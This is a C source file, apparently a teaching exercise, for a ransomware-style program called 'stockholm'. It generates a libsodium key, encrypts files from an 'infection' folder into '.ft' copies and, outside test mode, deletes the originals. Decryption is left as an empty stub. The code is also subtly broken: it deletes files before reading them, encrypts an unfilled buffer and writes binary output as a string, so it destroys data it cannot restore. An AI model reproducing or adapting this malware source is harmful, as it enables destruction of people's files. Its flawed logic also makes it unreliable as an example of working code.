#include "stockholm.h"

int	reverse = 0;

char	*addcrypt(char *file)
{
	char	*crypt = malloc(strlen(file) + 1 + strlen("../crypted/"));
	if (!crypt)
		exit(1);
	int		i = -1;

	crypt[0] = '.';
	crypt[1] = '.';
	crypt[2] = '/';
	crypt[3] = 'c';
	crypt[4] = 'r';
	crypt[5] = 'y';
	crypt[6] = 'p';
	crypt[7] = 't';
	crypt[8] = 'e';
	crypt[9] = 'd';
	crypt[10] = '/';
	while (file[++i])
		crypt[i + 11] = file[i];
	free(file);
	crypt[i + 11] = 0;
	return (crypt);
}

int	filelen(char *filename)
{
	FILE *file = fopen(filename, "r");

	if (file == NULL)
	{
		fprintf(stderr, "%s can't be open !\n", filename);
		return (-1);
	}
	char	ch;
	int		count = 0;
	while ((ch = fgetc(file)) != EOF)
		count++;
	return (count);
}

char	*chgext(char *filename)
{
	int	i;
	int	eof = 1; // "\0"
	int	ftext = 3; // ".ft"

	i = 0;
	while (filename[i] && filename[i] != '.')
		i++;
	char	*ft = malloc((i + ftext + eof) * sizeof(char));
	if (!ft)
		return (NULL);
	i = -1;
	while (filename[++i] && filename[i] != '.')
		ft[i] = filename[i];
	ft[i++] = '.';
	ft[i++] = 'f';
	ft[i++] = 't';
	ft[i] = 0;
	return (ft);
}

void	encrypt(struct linkedFile *list, struct cryptFile data)
{
	char	cwd[1024];
	if (TEST)
		system("mkdir crypted");
	while (list)
	{
		getcwd(cwd, sizeof(cwd));
		if (chdir("infection") != 0 && strcmp("/infection", cwd + strlen(cwd) - 10))
			(perror("Can't find the infection file !\n"), exit(1));
		
		FILE *fp;
		if (TEST)
			fp = fopen(addcrypt(chgext(list->file)), "wb");
		else
			fp = fopen(chgext(list->file), "wb");
		if (fp == NULL)
			printf("hihiahaha\n");
		
		if (TEST == 0)
		{
			if (remove(list->file) == 0)
				fprintf(stderr, "%s can't delete file", list->file);
		}

		int	flen = filelen(list->file);
		char	*buffer = malloc(flen + 1);
		if (!buffer)
		{
			perror("Allocation memory failed :<");
			exit(0);
		}

		unsigned char cypher[flen + crypto_secretbox_MACBYTES];

		if (crypto_secretbox_easy(cypher, (const unsigned char *)buffer, flen, data.nonce, data.key) != 0) {
			fprintf(stderr, "%s file : Encryption failed\n", list->file);
		}

		printf("\033[1;35mFile %s is now encrypted !\033[0m\n", list->file);
		fprintf(fp, "%s\n", cypher);
		fclose(fp);
		free(buffer);
		list = list->next;
	}
	printf("%s\n", ENCRYPTION_SUCCESS);
}

void	decrypt(struct linkedFile *list)
{
	(void)list;
}

void	writeKey(struct cryptFile *data)
{
	unsigned int key_size = crypto_secretbox_KEYBYTES;  
	unsigned char key[key_size];
	unsigned char nonce[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce, sizeof(nonce));
	crypto_secretbox_keygen(key);

	memcpy((*data).key, key, sizeof(key));
	memcpy((*data).nonce, nonce, sizeof(nonce)); 

	FILE *fp = fopen("key.crypt", "wb");

	if (fp == NULL)
	{
		printf("Error: fopen() failed\n");
		return ;
	}
	fwrite("key : ", sizeof(unsigned char), 6, fp);
	fwrite(key, sizeof(unsigned char), key_size, fp);
	fwrite("\nnonce : ", sizeof(unsigned char), 9, fp);
	fwrite(nonce, sizeof(unsigned char), crypto_secretbox_NONCEBYTES, fp);
	fclose(fp);
}

int		main(int argc, char *argv[], char *env[])
{
	(void)env;
	if (argc > 3)
	{
		printf("%s", DEFAULT_HELP);
		exit(0);
	}
	
	if (sodium_init() == -1)
	{
		printf("Error: sodium_init() failed\n");
		return (1);
	}
	
	if (argc > 1)
	{
		if ((reverse = optionprog(argv[1], argc)))
			goto init;
		return (0);
	}

	init:
	struct linkedFile *file = openFile();
	if (!file)
	{
		printf("Nothing to encrypt in the ./infection/\n");
		exit(0);
	}

	struct cryptFile data;
	if (reverse == 0)
	{
		writeKey(&data); // write key encrypt in key.crypt "."
		printf("%s\n", FILE_DELETED);
	}

	
	/*	Print linked list
	for (struct linkedFile *tmp = file; tmp; tmp = tmp->next)
		printf("name : %s\n", tmp->file);
	*/
	if (reverse)
		decrypt(file);
	else
		encrypt(file, data);
	clearlist(&file);
	return (0);
}